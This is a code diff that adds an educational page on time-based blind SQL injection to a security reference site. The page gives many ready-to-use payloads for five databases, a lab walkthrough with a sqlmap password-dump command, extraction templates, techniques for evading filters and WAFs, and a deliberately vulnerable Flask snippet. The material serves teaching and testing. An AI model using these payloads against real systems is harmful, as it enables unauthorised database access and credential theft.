@@ -280,6 +280,7 @@ var PAGE_UPDATED = {
   'sqli-classic-inband':  {date: '2026-03-24', version: 'v1.0.0'},
   'sqli-error-based':     {date: '2026-03-24', version: 'v1.0.0'},
   'sqli-union-based':     {date: '2026-03-24', version: 'v1.0.0'},
+  'sqli-time-blind':      {date: '2026-03-31', version: 'v1.0.0'},
   'sqli-blind-boolean':   {date: '2026-03-24', version: 'v1.0.0'}
 };
 
@@ -7193,6 +7194,1806 @@ client.query('SELECT * FROM products WHERE category = $1', [userInput]);
 \`\`\`
 `;
 
+
+PAGES.sqli_time_blind = `<p>
+<span style="background:#dc3545;color:#fff;padding:2px 8px;border-radius:3px;font-weight:bold;">CRITICAL</span>&nbsp;
+<span style="background:#6c757d;color:#fff;padding:2px 8px;border-radius:3px;">CWE-89</span>&nbsp;
+<span style="background:#6c757d;color:#fff;padding:2px 8px;border-radius:3px;">CAPEC-7</span>&nbsp;
+<span style="background:#dc3545;color:#fff;padding:2px 8px;border-radius:3px;">CVSS 9.8</span>&nbsp;
+<span style="background:#fd7e14;color:#fff;padding:2px 8px;border-radius:3px;">OWASP A05:2025</span>&nbsp;
+<span style="background:#17a2b8;color:#fff;padding:2px 8px;border-radius:3px;">CWE Top 25: 2019-2025</span>
+</p>
+
+# Time-Based Blind SQL Injection
+
+**CAT-01 > SQL Injection > Time-Based Blind**
+
+---
+
+## Overview
+
+Time-based blind SQL injection exploits a single side channel that no application hardening can suppress: the passage of time. The attacker injects conditional time-delay functions into SQL queries and measures HTTP response latency to infer boolean TRUE/FALSE conditions about the database. There is no data in the response body. There are no error messages. There are no content differences between success and failure. The only observable signal is whether the server took 5 seconds or 0.2 seconds to respond.
+
+The mechanism is fundamental. Every major relational database ships with a function that pauses execution for a specified duration: MySQL provides \`SLEEP()\`, Microsoft SQL Server provides \`WAITFOR DELAY\`, PostgreSQL provides \`pg_sleep()\`, and Oracle provides \`DBMS_PIPE.RECEIVE_MESSAGE()\`. SQLite alone lacks a native sleep function, but achieves equivalent delays through computationally expensive operations like \`RANDOMBLOB()\` chained with \`HEX()\` and \`UPPER()\`. When an attacker wraps these delay functions inside a conditional expression -- \`IF(condition, SLEEP(5), 0)\` on MySQL or \`CASE WHEN condition THEN pg_sleep(5) ELSE pg_sleep(0) END\` on PostgreSQL -- the database pauses only when the condition evaluates to TRUE. By substituting different conditions and measuring whether each response is delayed, the attacker reconstructs arbitrary data from the database one character at a time.
+
+This technique is the method of last resort in the SQL injection hierarchy. Classic in-band injection returns query results directly in the HTTP response. Error-based injection leaks data through database error messages. Union-based injection appends attacker-controlled rows to legitimate result sets. Boolean-based blind injection detects content differences between true and false conditions. Time-based blind injection requires none of these signals. It works when the application catches all errors gracefully, returns identical responses for valid and invalid queries, and reflects no query output whatsoever. The response body for a correct condition and an incorrect condition is byte-for-byte identical. Only timing differs.
+
+The tradeoff is speed. Extracting a 20-character password via binary search requires approximately 140 requests (7 per character), each incurring the injected delay. At 5 seconds per TRUE condition, extracting a single password takes roughly 12 minutes under optimal conditions. A full database dump can take hours or days. This is the price of using time as the sole information channel. However, this disadvantage is increasingly mitigated by optimization techniques: binary search reduces queries per character from 96 (linear) to 7, bitwise extraction enables parallel character extraction, probabilistic language models (Hakuin, IEEE SPW 2023) achieve 3-26x speedups over sqlmap, and HTTP/2 single-packet timing (James Kettle, Black Hat USA 2024) detects delays as small as 200 microseconds -- reducing injected delays from seconds to sub-milliseconds and making extraction orders of magnitude faster.
+
+The fundamental equation governing time-based blind SQL injection is Kettle's signal-to-noise formulation: \`Attack success = Signal size / Noise level\`. Signal is the injected delay. Noise is the combination of network jitter (packet round-trip variance), server-side jitter (CPU load, concurrent processing, virtualization effects, garbage collection), DNS resolution variance, TLS handshake variance, and load balancer routing. When noise exceeds signal, the attack becomes impractical. The attacker's task is to maximize signal (longer delays, signal amplification) and minimize noise (connection reuse, HTTP/2 multiplexing, statistical aggregation, baseline calibration).
+
+Despite its slow extraction speed, time-based blind SQL injection has been the initial exploitation vector in multiple critical enterprise compromises. CVE-2023-48788 (Fortinet FortiClientEMS, CVSS 9.8) was confirmed exploitable using \`WAITFOR DELAY '00:00:10'\`, leading to unauthenticated RCE as NT AUTHORITY\\SYSTEM. CVE-2024-22120 (Zabbix Server, CVSS 9.1) used \`pg_sleep()\` for time-based extraction of the entire database, escalating to admin privileges and RCE. CVE-2023-34362 (MOVEit Transfer, CVSS 9.8) was exploited as a zero-day by the Cl0p ransomware gang, compromising 2,500+ organizations and exposing 94+ million records. The technique has been present in the CWE Top 25 every year since 2019 and remains classified as OWASP A05:2025 Injection.
+
+---
+
+## Understanding From Zero
+
+### The Core Concept (No Jargon)
+
+Imagine you are standing in front of a thick concrete wall. You cannot see through it. You cannot hear anything from the other side. There are no windows, no cracks, no holes. The only thing you can do is knock.
+
+When you knock on a solid section, the sound is dull and the wall does not vibrate. When you knock on a hollow section, there is a faint echo and the wall resonates slightly longer. You cannot see what is behind the hollow section, but you know something is there because the knock took longer to settle.
+
+Time-based blind SQL injection works exactly like this. The database is behind the wall. The application will not show you any results, will not leak any errors, and returns the exact same page regardless of what you send. But you can ask it yes/no questions, and when the answer is "yes," you tell it to wait 5 seconds before responding. When the answer is "no," it responds immediately.
+
+- "Is the first character of the admin password greater than 'm'?" Response in 0.3 seconds = no.
+- "Is it greater than 'f'?" Response in 5.3 seconds = yes.
+- "Is it greater than 'i'?" Response in 5.2 seconds = yes.
+- "Is it greater than 'k'?" Response in 0.3 seconds = no.
+- "Is it greater than 'j'?" Response in 5.3 seconds = yes.
+- "Is it equal to 'k'?" Response in 0.2 seconds = no. Therefore the character is 'j' (but wait, > j was no and > i was yes, so it must be 'j').
+
+Seven questions, and you know the first character. Repeat for each position. The delay is your echo. Time is the only signal.
+
+### What's Actually Happening (Technical)
+
+The application has code like this (Python/Flask example):
+
+\`\`\`python
+# VULNERABLE: user input concatenated into SQL
+tracking_id = request.cookies.get('TrackingId')
+query = f"SELECT * FROM tracking WHERE id = '{tracking_id}'"
+result = db.execute(query)
+# Application returns 200 OK with identical content regardless of result
+\`\`\`
+
+When the attacker sends this cookie:
+
+\`\`\`
+TrackingId=abc' || (SELECT CASE WHEN (SUBSTRING(password,1,1)='s') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator') --
+\`\`\`
+
+The database evaluates the condition. If the first character of the administrator's password IS 's', the database sleeps for 5 seconds before returning. If not, it returns immediately. The HTTP response body is identical in both cases. Only the response time differs.
+
+### Why Standard Defenses Fail
+
+Custom error pages do not help -- there are no errors involved. Response normalization does not help -- there are no content differences to normalize. HTTP response code filtering does not help -- the code is 200 in both cases. The only complete defense is parameterized queries, which separate SQL structure from data values entirely. Even query time limits are imperfect: they may break legitimate slow queries while the attacker simply calibrates below the threshold.
+
+---
+
+## Attack Surface Identification
+
+### Primary Injection Points
+
+| Vector | Example | Why Targeted |
+|--------|---------|-------------|
+| URL query parameters | \`?id=1\`, \`?search=test\`, \`?sort=name\` | Most common and most tested |
+| POST body fields | \`username=admin\`, \`email=x@y.com\` | Login, registration, search forms |
+| Cookie values | \`TrackingId=abc123\`, \`session=xyz\` | Developers rarely sanitize cookies |
+| HTTP headers | \`X-Forwarded-For\`, \`User-Agent\`, \`Referer\` | Logged to database for analytics |
+| JSON API fields | \`{"filter": {"id": 1}}\` | Modern APIs often construct dynamic queries |
+| GraphQL arguments | \`query { user(id: "1") { name } }\` | Resolvers may concatenate arguments |
+| REST path segments | \`/api/users/1\` | Mapped to WHERE clause by ORM |
+| ORDER BY parameters | \`?sort=name&dir=ASC\` | Parameterization not possible for column names |
+| LIMIT/OFFSET | \`?page=1&per_page=20\` | Integer injection in pagination |
+| XML/SOAP elements | \`<userId>1</userId>\` | Legacy enterprise services |
+
+### High-Value Targets for Time-Based Testing
+
+1. **Endpoints with identical responses** -- Search pages that return "no results" whether the query is valid or invalid
+2. **API endpoints returning fixed status codes** -- REST APIs that always return 200 with empty JSON
+3. **Login forms** -- Always return "invalid credentials" regardless of injection
+4. **Forgot password forms** -- Always return "if account exists, email sent"
+5. **Analytics/tracking parameters** -- Cookie values, referrer headers processed silently
+6. **ORDER BY / SORT parameters** -- Cannot use prepared statements for column names
+7. **Batch/import endpoints** -- File upload handlers that process CSV/XML into SQL
+
+---
+
+## How It Works
+
+\`\`\`mermaid
+sequenceDiagram
+    participant Attacker
+    participant WebApp
+    participant Database
+
+    Note over Attacker: Phase 1 - Confirm Injection
+    Attacker->>WebApp: param=' OR SLEEP(5)-- -
+    WebApp->>Database: SELECT * FROM t WHERE id='' OR SLEEP(5)-- -'
+    Database-->>Database: Pauses 5 seconds
+    Database->>WebApp: Result (after 5s)
+    WebApp->>Attacker: Response (5.2s total)
+    Note over Attacker: 5s delay = injectable
+
+    Note over Attacker: Phase 2 - Conditional Logic
+    Attacker->>WebApp: param=' AND IF(1=1, SLEEP(5), 0)-- -
+    WebApp->>Database: ...IF(1=1, SLEEP(5), 0)...
+    Database-->>Database: Condition TRUE -> sleeps 5s
+    Database->>WebApp: Result (after 5s)
+    WebApp->>Attacker: Response (5.2s) = TRUE confirmed
+
+    Attacker->>WebApp: param=' AND IF(1=2, SLEEP(5), 0)-- -
+    WebApp->>Database: ...IF(1=2, SLEEP(5), 0)...
+    Database-->>Database: Condition FALSE -> no sleep
+    Database->>WebApp: Result (immediate)
+    WebApp->>Attacker: Response (0.2s) = FALSE confirmed
+
+    Note over Attacker: Phase 3 - Binary Search Extraction
+    Attacker->>WebApp: IF(ASCII(SUBSTR(password,1,1))>79, SLEEP(5), 0)
+    WebApp->>Attacker: 5.2s = char > 79 (TRUE)
+    Attacker->>WebApp: IF(ASCII(SUBSTR(password,1,1))>103, SLEEP(5), 0)
+    WebApp->>Attacker: 0.2s = char <= 103 (FALSE)
+    Attacker->>WebApp: IF(ASCII(SUBSTR(password,1,1))>91, SLEEP(5), 0)
+    WebApp->>Attacker: 5.1s = char > 91 (TRUE)
+    Note over Attacker: ...continue bisecting until char identified
+    Note over Attacker: ~7 requests per character via binary search
+\`\`\`
+
+---
+
+## Detection & Validation
+
+### Step 1: Unconditional Delay Probes
+
+Inject a delay with no condition. If the response takes ~N seconds longer than normal, the injection point exists.
+
+| Database | Probe Payload | Expected Signal |
+|----------|--------------|----------------|
+| MySQL | \`' OR SLEEP(5)-- -\` | +5s response time |
+| PostgreSQL | \`' \\|\\| pg_sleep(5)--\` | +5s response time |
+| MSSQL | \`'; WAITFOR DELAY '0:0:5'--\` | +5s response time |
+| Oracle | \`' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--\` | +5s response time |
+| SQLite | \`' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--\` | +3-10s response time |
+
+### Step 2: Conditional Verification
+
+Send TRUE and FALSE conditions. TRUE should delay, FALSE should not.
+
+\`\`\`sql
+-- MySQL
+TRUE:  ' AND IF(1=1, SLEEP(5), 0)-- -        --> ~5s
+FALSE: ' AND IF(1=2, SLEEP(5), 0)-- -        --> ~0s
+
+-- PostgreSQL
+TRUE:  '; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--    --> ~5s
+FALSE: '; SELECT CASE WHEN (1=2) THEN pg_sleep(5) ELSE pg_sleep(0) END--    --> ~0s
+
+-- MSSQL
+TRUE:  '; IF (1=1) WAITFOR DELAY '0:0:5'--   --> ~5s
+FALSE: '; IF (1=2) WAITFOR DELAY '0:0:5'--   --> ~0s
+
+-- Oracle
+TRUE:  ' AND 1=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END)-- --> ~5s
+FALSE: ' AND 1=(CASE WHEN (1=2) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END)-- --> ~0s
+\`\`\`
+
+### Step 3: Baseline Comparison
+
+1. Send 10 normal requests, record response times
+2. Calculate mean and standard deviation
+3. A valid injection shows response time > mean + (delay - 0.5s)
+4. Verify linearity: \`SLEEP(3)\` -> +3s, \`SLEEP(6)\` -> +6s, \`SLEEP(9)\` -> +9s
+
+### Step 4: Rule Out False Positives
+
+- Test the same payload with different delay values (3s, 5s, 10s) -- delay should scale linearly
+- Send the payload 3-5 times -- delay should be consistent
+- Send during different server load conditions -- delay should persist
+- Compare TRUE vs FALSE in alternating pairs
+
+---
+
+## Beginner Lab Walkthrough
+
+### PortSwigger Lab: "Blind SQL injection with time delays and information retrieval"
+
+**Objective:** Extract the \`administrator\` password from the \`users\` table using time-based blind SQL injection in the \`TrackingId\` cookie. PostgreSQL backend.
+
+**Step 1: Confirm injection exists**
+
+Modify the \`TrackingId\` cookie:
+
+\`\`\`
+TrackingId=xyz'||pg_sleep(10)--
+\`\`\`
+
+Observe: Response takes ~10 seconds. The \`TrackingId\` value is injectable.
+
+**Step 2: Confirm conditional logic works**
+
+\`\`\`
+TrackingId=xyz';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+\`\`\`
+
+Response: ~10 seconds (TRUE condition triggers delay).
+
+\`\`\`
+TrackingId=xyz';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+\`\`\`
+
+Response: ~0 seconds (FALSE condition, no delay). Conditional injection confirmed.
+
+**Step 3: Verify the administrator user exists**
+
+\`\`\`
+TrackingId=xyz';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+\`\`\`
+
+Response: ~10 seconds. The \`administrator\` user exists in the \`users\` table.
+
+**Step 4: Determine password length**
+
+\`\`\`
+TrackingId=xyz';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+\`\`\`
+
+Response: ~10 seconds. Password is longer than 1 character. Repeat with increasing values:
+
+- \`LENGTH(password)>10\` -> 10s delay (length > 10)
+- \`LENGTH(password)>15\` -> 10s delay (length > 15)
+- \`LENGTH(password)>20\` -> 0s (length <= 20)
+- \`LENGTH(password)>19\` -> 10s delay (length > 19)
+- \`LENGTH(password)>20\` -> 0s (confirmed: password is exactly 20 characters)
+
+**Step 5: Extract password character by character**
+
+Configure Burp Suite Intruder:
+- Attack type: Sniper
+- Payload position: the character being tested
+- **Resource pool: Maximum concurrent requests = 1** (critical for timing accuracy)
+
+For position 1:
+
+\`\`\`
+TrackingId=xyz';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+\`\`\`
+
+Iterate through \`a-z\` and \`0-9\` for each position. The payload that causes a ~10-second response reveals the correct character. Alternatively, use binary search with ASCII comparisons for faster extraction (7 requests per character instead of 36):
+
+\`\`\`
+TrackingId=xyz';SELECT CASE WHEN (username='administrator' AND ASCII(SUBSTRING(password,1,1))>79) THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users--
+\`\`\`
+
+**Step 6: Automate with sqlmap**
+
+\`\`\`bash
+sqlmap -u "https://target-lab.web-security-academy.net/filter?category=Gifts" \\
+  --cookie="TrackingId=xyz*; session=YOUR_SESSION" \\
+  --technique=T --time-sec=5 --dbms=postgresql \\
+  --threads=1 -D public -T users -C password \\
+  --where="username='administrator'" --dump
+\`\`\`
+
+---
+
+## Techniques
+
+### Level 0: Understanding Timing as a Signal
+
+Time-based blind SQL injection reduces database interaction to a binary channel: DELAY or NO DELAY. Every piece of information -- database version, table names, column names, row data -- is extracted through this single bit of information per query.
+
+**The information channel:**
+- 1 query = 1 bit of information (delayed = TRUE, not delayed = FALSE)
+- 1 character = 7 bits (printable ASCII range 32-127)
+- Binary search optimization: 7 queries per character (log2(96) ~ 6.6)
+- 20-character string = ~140 queries minimum
+
+**Why this is the technique of last resort:**
+
+| SQLi Variant | Data per Request | Speed | Requirements |
+|-------------|-----------------|-------|-------------|
+| Union-Based | Full row | Fastest | Output reflection |
+| Error-Based | ~100 bytes | Fast | Error messages displayed |
+| Classic In-Band | Full result | Fast | Direct output |
+| Boolean Blind | 1 bit | Moderate | Content difference |
+| **Time-Based Blind** | **1 bit** | **Slowest** | **Nothing -- always works** |
+
+### Level 1: Basic Delay Confirmation
+
+The simplest payloads confirm whether the injection point reaches the database engine.
+
+**MySQL:**
+\`\`\`sql
+' AND SLEEP(5)-- -
+' OR SLEEP(5)-- -
+(SELECT 1 FROM (SELECT SLEEP(5))A)
+1'=sleep(5)='1
+\`\`\`
+
+**PostgreSQL:**
+\`\`\`sql
+'; SELECT pg_sleep(5)--
+' || pg_sleep(5)--
+AND 1=(SELECT 1 FROM pg_sleep(5))
+\`\`\`
+
+**MSSQL:**
+\`\`\`sql
+'; WAITFOR DELAY '0:0:5'--
+1; WAITFOR DELAY '0:0:5'--
+'); WAITFOR DELAY '0:0:5'--
+\`\`\`
+
+**Oracle:**
+\`\`\`sql
+AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)--
+\`\`\`
+
+**SQLite:**
+\`\`\`sql
+AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--
+AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))--
+\`\`\`
+
+**Conditional confirmation (TRUE vs FALSE):**
+
+\`\`\`sql
+-- MySQL: TRUE should delay, FALSE should not
+' AND IF(1=1, SLEEP(5), 0)-- -
+' AND IF(1=2, SLEEP(5), 0)-- -
+
+-- MySQL XOR trick (always useful when AND/OR blocked)
+'XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))OR'
+\`\`\`
+
+### Level 2: Conditional Extraction with Binary Search
+
+Once conditional logic is confirmed, extract data character by character using binary search over the ASCII range.
+
+**Algorithm (7 requests per character):**
+
+\`\`\`
+Range: low=32, high=127
+Step 1: mid=79.  ASCII(SUBSTR(data,pos,1)) > 79?  TRUE -> low=80
+Step 2: mid=103. ASCII(SUBSTR(data,pos,1)) > 103? FALSE -> high=103
+Step 3: mid=91.  ASCII(SUBSTR(data,pos,1)) > 91?  TRUE -> low=92
+Step 4: mid=97.  ASCII(SUBSTR(data,pos,1)) > 97?  FALSE -> high=97
+Step 5: mid=94.  ASCII(SUBSTR(data,pos,1)) > 94?  TRUE -> low=95
+Step 6: mid=96.  ASCII(SUBSTR(data,pos,1)) > 96?  FALSE -> high=96
+Step 7: mid=95.  ASCII(SUBSTR(data,pos,1)) > 95?  TRUE -> low=96
+Result: low=high=96 -> chr(96) = backtick, but high=96 from step 6, so value is 96
+\`\`\`
+
+**Extraction speed comparison:**
+
+| Method | Queries per Character | 20-char password (5s delay) | 20-char password (2s delay) |
+|--------|----------------------|----------------------------|----------------------------|
+| Linear brute force (worst) | 96 | ~2.7 hours | ~1.1 hours |
+| Linear brute force (average) | 48 | ~1.3 hours | ~32 minutes |
+| Binary search | 7 | ~11.7 minutes | ~4.7 minutes |
+| Bitwise extraction | 7-8 | ~11.7-13.3 minutes | ~4.7-5.3 minutes |
+
+**Binary search templates per database:**
+
+MySQL:
+\`\`\`sql
+' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),{pos},1))>{mid}, SLEEP(5), 0)-- -
+\`\`\`
+
+PostgreSQL:
+\`\`\`sql
+'; SELECT CASE WHEN ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),{pos},1))>{mid} THEN pg_sleep(5) ELSE pg_sleep(0) END--
+\`\`\`
+
+MSSQL:
+\`\`\`sql
+'; IF ASCII(SUBSTRING((SELECT TOP 1 password FROM users),{pos},1))>{mid} WAITFOR DELAY '0:0:5'--
+\`\`\`
+
+Oracle:
+\`\`\`sql
+AND 1=(SELECT CASE WHEN ASCII(SUBSTR((SELECT password FROM users WHERE ROWNUM=1),{pos},1))>{mid} THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 1 END FROM dual)
+\`\`\`
+
+SQLite:
+\`\`\`sql
+AND CASE WHEN UNICODE(SUBSTR((SELECT password FROM users LIMIT 1),{pos},1))>{mid} THEN LIKE('A',UPPER(HEX(RANDOMBLOB(500000000/2)))) ELSE 0 END
+\`\`\`
+
+**Data length determination (always extract length before characters):**
+
+\`\`\`sql
+-- MySQL
+' AND IF(LENGTH(DATABASE())={n}, SLEEP(5), 0)-- -
+
+-- PostgreSQL
+'; SELECT CASE WHEN LENGTH(password)>{n} THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
+
+-- MSSQL
+'; IF LEN(DB_NAME())>{n} WAITFOR DELAY '0:0:5'--
+\`\`\`
+
+### Level 3: Heavy Query Techniques (When SLEEP is Blocked)
+
+When WAFs, application filters, or database configuration block native delay functions (\`SLEEP\`, \`WAITFOR\`, \`pg_sleep\`, \`DBMS_PIPE\`), heavy queries force delays through computationally expensive operations. The database cannot distinguish between a "legitimate" expensive query and a deliberately injected one.
+
+#### Principle
+
+Cross-join system catalog tables to produce massive Cartesian products. A table with 500 rows cross-joined 3 times produces 125,000,000 rows. The \`COUNT(*)\` aggregation forces the database to process every row, creating a measurable delay.
+
+#### MySQL Heavy Queries
+\`\`\`sql
+-- 3-way Cartesian on information_schema (5-15 seconds typical)
+' OR (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C) > 0-- -
+
+-- Conditional extraction with heavy query
+' OR IF(condition, (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C), 0)-- -
+
+-- BENCHMARK alternative (CPU-intensive, not wall-clock)
+' AND BENCHMARK(10000000, SHA1('test'))-- -
+' AND IF(condition, BENCHMARK(10000000, MD5('x')), 0)-- -
+\`\`\`
+
+#### PostgreSQL Heavy Queries
+\`\`\`sql
+-- GENERATE_SERIES (primary method)
+' OR (SELECT COUNT(*) FROM GENERATE_SERIES(1, 5000000)) > 0-- -
+
+-- Recursive CTE
+' OR (WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM r WHERE n < 5000000) SELECT COUNT(*) FROM r) > 0-- -
+
+-- Cartesian on pg_catalog
+' OR (SELECT COUNT(*) FROM pg_catalog.pg_class A, pg_catalog.pg_class B, pg_catalog.pg_class C) > 0-- -
+\`\`\`
+
+#### MSSQL Heavy Queries
+\`\`\`sql
+-- Cartesian on system views (Chema Alonso technique, DEF CON 16)
+' AND (SELECT COUNT(*) FROM sysusers AS s1, sysusers AS s2, sysusers AS s3, sysusers AS s4, sysusers AS s5, sysusers AS s6, sysusers AS s7, sysusers AS s8) > 0-- -
+
+-- Recursive CTE (must override default 100 limit)
+'; WITH r AS (SELECT 1 AS n UNION ALL SELECT n+1 FROM r WHERE n < 5000000) SELECT COUNT(*) FROM r OPTION (MAXRECURSION 0);--
+
+-- CPU loop
+DECLARE @i INT SELECT @i = 0 WHILE @i < 0xAFFFF BEGIN SELECT @i = @i + 1 END
+\`\`\`
+
+#### Oracle Heavy Queries
+\`\`\`sql
+-- Cartesian on all_objects (primary for Oracle due to no stacked queries)
+' AND (SELECT COUNT(*) FROM all_objects A, all_objects B, all_objects C) > 0-- -
+
+-- CONNECT BY hierarchical query
+' OR (SELECT COUNT(*) FROM (SELECT 1 FROM dual CONNECT BY LEVEL <= 5000000)) > 0-- -
+
+-- May need 7+ joins for databases with few objects
+' AND (SELECT COUNT(*) FROM all_users A, all_users B, all_users C, all_users D, all_users E, all_users F, all_users G) > 0-- -
+\`\`\`
+
+#### SQLite Heavy Queries
+\`\`\`sql
+-- RANDOMBLOB (primary and often ONLY method)
+' AND 1=LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(500000000/2))))-- -
+
+-- ZEROBLOB variant
+' AND LENGTH(ZEROBLOB(800000000)) > 0-- -
+
+-- Recursive CTE (SQLite 3.8.3+)
+' AND (WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM r WHERE n < 10000000) SELECT COUNT(*) FROM r) > 0-- -
+\`\`\`
+
+#### Calibration Strategy
+
+1. Start with 2 cross-joined system tables, measure delay
+2. If too fast (< 2 seconds), add another join
+3. If too slow (> 15 seconds), add a \`WHERE\` clause to limit rows
+4. Target 3-5 second delay for reliable detection
+5. Always calibrate per-target -- delay depends on database size, server hardware, and concurrent load
+6. Heavy queries are non-deterministic: use 2-3x margin over detection threshold and verify with multiple samples
+
+### Level 4: Bit-Level Extraction, Adaptive Calibration, and Alternative Functions
+
+#### Bitwise Extraction (Chris Anley Technique)
+
+Extract individual bits of each ASCII byte. 7-8 requests per character, but each request is independent and can be parallelized.
+
+\`\`\`sql
+-- MSSQL: extract each bit of each byte
+DECLARE @s VARCHAR(8000) SELECT @s = DB_NAME()
+IF (ASCII(SUBSTRING(@s, 1, 1)) & 1) > 0 WAITFOR DELAY '0:0:5'    -- bit 0
+IF (ASCII(SUBSTRING(@s, 1, 1)) & 2) > 0 WAITFOR DELAY '0:0:5'    -- bit 1
+IF (ASCII(SUBSTRING(@s, 1, 1)) & 4) > 0 WAITFOR DELAY '0:0:5'    -- bit 2
+IF (ASCII(SUBSTRING(@s, 1, 1)) & 8) > 0 WAITFOR DELAY '0:0:5'    -- bit 3
+IF (ASCII(SUBSTRING(@s, 1, 1)) & 16) > 0 WAITFOR DELAY '0:0:5'   -- bit 4
+IF (ASCII(SUBSTRING(@s, 1, 1)) & 32) > 0 WAITFOR DELAY '0:0:5'   -- bit 5
+IF (ASCII(SUBSTRING(@s, 1, 1)) & 64) > 0 WAITFOR DELAY '0:0:5'   -- bit 6
+-- Reconstruct: sum all bit values where delay was observed
+\`\`\`
+
+**Advantage:** Each bit extraction is independent, enabling 7 parallel requests per character. With HTTP/2 multiplexing, this extracts a full character in a single round trip.
+
+#### MySQL Alternative Delay Functions
+
+When \`SLEEP\` is filtered, these alternatives achieve equivalent delays:
+
+\`\`\`sql
+-- BENCHMARK: CPU-intensive iteration (available since MySQL 3.23)
+' AND BENCHMARK(10000000, MD5('x'))-- -
+' AND BENCHMARK(10000000, SHA1('test'))-- -
+
+-- GET_LOCK: blocks for timeout if lock held by another session
+' OR GET_LOCK('sqli_lock', 5)-- -
+-- Self-blocking on MySQL < 5.7:
+' OR (SELECT GET_LOCK('a',0) + GET_LOCK('a',5))-- -
+
+-- ELT function wrapper
+' OR ELT(1=1, SLEEP(5))-- -
+
+-- MAKE_SET function wrapper
+' OR MAKE_SET(1, SLEEP(5))-- -
+\`\`\`
+
+#### Adaptive Delay Calibration
+
+Different servers require different delay values. A fast API server (5ms baseline) only needs 200ms delay, while a loaded CMS (500ms baseline) needs 10+ seconds.
+
+**Algorithm:**
+1. Measure baseline: 10-20 normal requests, calculate mean, stddev, P95, P99
+2. Calculate minimum delay: \`P99 + (3 * stddev)\`, minimum 0.5 seconds
+3. Verify: inject \`SLEEP(calculated_delay)\`, confirm response time = mean + delay (+/- 1 stddev)
+4. Recalibrate every N requests to adapt to changing server load
+5. If 429 (rate limited), reduce request frequency; if consecutive timeouts, increase delay
+
+#### Parallel Extraction Strategies
+
+\`\`\`
+Strategy 1: Bit-Level Parallelism
+  Send 7 concurrent requests, each testing one bit of the character
+  7x speedup per character (one round = one full character)
+
+Strategy 2: Position-Level Parallelism
+  Different connections extract different character positions simultaneously
+  N threads = N positions extracted in parallel
+
+Strategy 3: HTTP/2 Multiplexed Batch
+  Pack 50-100 probes into a single HTTP/2 connection
+  Send as single TCP burst, process response ordering in parallel
+\`\`\`
+
+### Level 5: HTTP/2 Single-Packet Timing, Timeless Timing Attacks, and ML Optimization
+
+#### HTTP/2 Single-Packet Timing (James Kettle, Black Hat USA 2024)
+
+James Kettle's "Listen to the Whispers" research (Black Hat USA 2024, DEF CON 32) transformed time-based blind injection from a noisy, multi-second attack into a precise, sub-millisecond technique. The core achievement: detecting timing differences as small as **200 microseconds (0.2ms)** -- a 150x improvement over the previous practical limit of ~30ms.
+
+**Mechanism:**
+
+The fundamental problem with traditional time-based injection is network jitter. Sending two requests "simultaneously" does not work -- they arrive at different times, and jitter masks small timing differences. The single-packet attack solves this using HTTP/2 multiplexing:
+
+1. Open a single HTTP/2 connection to the target
+2. Prepare multiple requests but withhold the final byte of each
+3. Wait until all request headers are at the server
+4. Send the final bytes of ALL requests simultaneously -- the OS coalesces them into a single TCP packet
+5. All requests arrive and begin processing at the same instant
+6. Measure which response arrives first -- relative ordering reveals timing differences
+
+**Refined dual-packet synchronization:** Disable \`TCP_NODELAY\`, send a PING frame (sacrificial packet ensuring OS coalesces subsequent frames), then send HTTP/2 headers with body data withheld except the final byte, wait ~100ms, send another PING frame, and complete all final frames.
+
+**Result:** "20 HTTP/2 requests from Melbourne to Dublin (~17,000km) with a median spread of 1ms."
+
+**Application to SQL injection:**
+
+Instead of \`SLEEP(5)\` (trivially detected by WAFs), use micro-delays:
+
+\`\`\`sql
+-- Lightweight conditional delay detectable via response ordering
+' OR IF(ASCII(SUBSTR(user(),1,1))>64, BENCHMARK(100, SHA1('x')), 0)-- -
+-- Only ~100 microseconds difference, invisible to WAFs, detectable via HTTP/2
+
+-- Even lighter: subquery count difference
+' OR IF(condition, (SELECT COUNT(*) FROM information_schema.columns LIMIT 100), 0)-- -
+-- A few milliseconds -- enough with single-packet timing
+\`\`\`
+
+**Statistical approach (Kettle):**
+- Take 30 measurements per payload pair
+- Compare bottom quartile of response times (filters out noise-dominated outliers)
+- Report findings when "response order was at least 80% biased toward one payload"
+- Detects SQL injection via \`'\` vs \`''\` through sub-millisecond timing differentials
+
+**Detection sensitivity comparison:**
+
+| Method | Minimum Detectable Delay | Reliability |
+|--------|-------------------------|-------------|
+| Traditional sequential | ~200ms | Low (jitter-dependent) |
+| HTTP/1.1 last-byte sync | ~10ms | Medium |
+| HTTP/2 single-packet | ~200us (0.2ms) | High |
